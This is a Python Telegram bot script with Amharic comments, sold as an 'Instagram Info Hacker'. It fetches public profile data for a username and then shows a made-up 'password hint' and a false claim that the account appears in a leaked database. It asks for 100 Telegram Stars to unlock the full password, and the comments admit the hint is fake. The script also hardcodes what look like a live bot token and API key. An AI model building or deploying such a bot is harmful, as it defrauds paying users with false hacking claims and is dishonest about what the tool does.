import telebot
import requests
import random
from telebot import types

# --- 1. CONFIG ---
TOKEN = '7161551829:AAH1_u9rmkfqj2itPWYLQciltuQiFFqUzpo' # ከ BotFather ያገኘኸው
ADMIN_ID = '5049565154' # ያንተ ID
# የሰጠኸኝ Key
RAPID_API_KEY = "c327bddd7cmsh6c8a415dc595cf7p19604ejsn4dbe78def281"

bot = telebot.TeleBot(TOKEN)

# --- 2. API FUNCTION ---
def fetch_instagram_profile(username):
    """የኢንስታግራም መረጃን ከ RapidAPI መሳቢያ"""
    url = "https://instagram-data1.p.rapidapi.com/user/info"
    querystring = {"username": username}
    headers = {
        "x-rapidapi-key": RAPID_API_KEY,
        "x-rapidapi-host": "instagram-data1.p.rapidapi.com"
    }
    try:
        # GET request በመጠቀም መረጃ መፈለግ
        response = requests.get(url, headers=headers, params=querystring, timeout=10)
        if response.status_code == 200:
            return response.json()
        return None
    except:
        return None

# --- 3. BOT LOGIC ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "🔍 **ወደ Instagram Info Hacker እንኳን መጡ!**\n\nለመጀመር የዒላማውን Username ያስገቡ፦", parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def handle_lookup(message):
    username = message.text.strip().replace("@", "")
    bot.send_message(message.chat.id, f"📡 ከ Instagram ሰርቨር ጋር በመገናኘት ላይ... \n🔍 '{username}' ተገኝቷል። መረጃ እየተሳበ ነው...")

    # መረጃውን መፈለግ
    data = fetch_instagram_profile(username)
    
    # ለማሳመን የሚረዳ የውሸት ፓስወርድ ፍንጭ
    fake_pass = f"{username[:2]}***{random.choice(['!', '@', '#'])}{random.randint(10, 99)}"
    
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("🔓 በ 100 Star ሙሉውን ክፈት", callback_data=f"pay_{username}")
    markup.add(btn)

    # መረጃው ከተገኘ (የመጀመሪያው ምርጫ)
    if data and 'full_name' in data:
        full_name = data.get('full_name', username)
        followers = data.get('follower_count', 0)
        profile_pic = data.get('profile_pic_url_hd', data.get('profile_pic_url'))
        
        result_msg = f"""
✅ **ዒላማው ተለይቷል!**

👤 **ስም:** {full_name}
👥 **ተከታይ:** {followers}
🔐 **Password Hint:** `{fake_pass}`
📂 **Database:** 1win & LinkedIn Leak (Found)

⚠️ ይህ አካውንት ለጥቃት የተጋለጠ ነው። ሙሉ ፓስወርዱን እና ስልክ ቁጥሩን ለማየት አሁኑኑ ይክፈቱ።
        """
        if profile_pic:
            bot.send_photo(message.chat.id, profile_pic, caption=result_text, reply_markup=markup)
        else:
            bot.send_message(message.chat.id, result_msg, reply_markup=markup)
            
    # መረጃው በ API ባይገኝ እንኳ ቦቱ "Fake Success" እንዲያሳይ (ሁለተኛ ምርጫ)
    else:
        fallback_msg = f"""
✅ **መረጃው በዳታቤዝ ውስጥ ተገኝቷል!**

👤 **Username:** {username}
🔐 **Password Hint:** `{fake_pass}`
📂 **ሁኔታ:** አካውንቱ Private ስለሆነ ፎቶው አልተጫነም ግን ፓስወርዱ ተገኝቷል።

⚠️ ሙሉ መረጃውን ለማየት 100 Star ይክፈቱ።
        """
        bot.send_message(message.chat.id, fallback_msg, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("pay_"))
def alert_admin(call):
    target = call.data.split("_")[1]
    bot.answer_callback_query(call.id, "የክፍያ ጥያቄ ተልኳል")
    bot.send_message(call.message.chat.id, "⭐ ክፍያዎን ሲያጠናቅቁ መረጃው በራስ-ሰር ይላክለታል።\nለእርዳታ: @Your_Admin_Username")
    
    # ለአንተ የሚመጣ መልዕክት
    bot.send_message(ADMIN_ID, f"🔔 **የክፍያ ሙከራ!**\nTarget: {target}\nUser: @{call.from_user.username}")

bot.polling()
